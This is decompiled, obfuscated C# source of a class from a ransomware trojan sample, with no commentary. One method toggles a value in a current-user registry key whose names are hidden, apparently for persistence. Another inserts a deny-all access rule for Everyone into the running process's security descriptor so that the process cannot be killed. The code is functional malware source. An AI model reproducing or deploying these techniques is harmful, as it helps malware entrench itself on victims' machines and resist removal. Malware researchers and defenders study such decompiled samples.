// Decompiled with JetBrains decompiler
// Type: gtzdezosLTmcL.AFyyeiAETeADU
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B8444C5B-FCC9-4B9F-A06C-7304BA49E3C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-1d4db8733c5f11ee8fca530aeb4a91069de04b1af64cbe1fa3ae2d3572a6e554.exe

using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace gtzdezosLTmcL
{
  internal sealed class AFyyeiAETeADU
  {
    [NonSerialized]
    internal static GetString \u0002;

    [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
    private static extern bool BRvZAKwMNwreD(
      IntPtr ItwqqbAiTz,
      int SGTBmKEHXT,
      [Out] byte[] NQjVbzxjIq,
      uint WYikAGIwYz,
      out uint wnondTyxgXbBip);

    [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
    private static extern bool eUVmjjCRehltv(
      IntPtr yMudpVNFpSjz,
      int ZAyYsgRAddkDkXGS,
      [In] byte[] pWnKTQIxZqNEt);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr dJOvByhHTugAXlgY();

    public void ZcmAsJhSoOPF([In] bool obj0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(AFyyeiAETeADU.\u0002(107368739));
        if (obj0 && subKey.GetValue(AFyyeiAETeADU.\u0002(107369142)) != null)
          subKey.DeleteValue(AFyyeiAETeADU.\u0002(107369142));
        else
          subKey.SetValue(AFyyeiAETeADU.\u0002(107369142), (object) AFyyeiAETeADU.\u0002(107395802));
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor BcJLCDouhFXE([In] IntPtr obj0)
    {
      byte[] NQjVbzxjIq = new byte[0];
      uint wnondTyxgXbBip;
      AFyyeiAETeADU.BRvZAKwMNwreD(obj0, 4, NQjVbzxjIq, 0U, out wnondTyxgXbBip);
      if (wnondTyxgXbBip < 0U || wnondTyxgXbBip > (uint) short.MaxValue)
        return (RawSecurityDescriptor) null;
      byte[] binaryForm;
      return !AFyyeiAETeADU.BRvZAKwMNwreD(obj0, 4, binaryForm = new byte[(IntPtr) wnondTyxgXbBip], wnondTyxgXbBip, out wnondTyxgXbBip) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
    }

    private void SqJByClmiUzZyH([In] IntPtr obj0, [In] RawSecurityDescriptor obj1)
    {
      byte[] numArray = new byte[obj1.BinaryLength];
      obj1.GetBinaryForm(numArray, 0);
      AFyyeiAETeADU.eUVmjjCRehltv(obj0, 4, numArray);
    }

    public void lSTDkhLUuqrpAl()
    {
      try
      {
        IntPtr num = AFyyeiAETeADU.dJOvByhHTugAXlgY();
        RawSecurityDescriptor securityDescriptor = this.BcJLCDouhFXE(num);
        securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        this.SqJByClmiUzZyH(num, securityDescriptor);
      }
      catch (Exception ex)
      {
      }
    }

    static AFyyeiAETeADU() => Strings.CreateGetStringDelegate(typeof (AFyyeiAETeADU));
  }
}
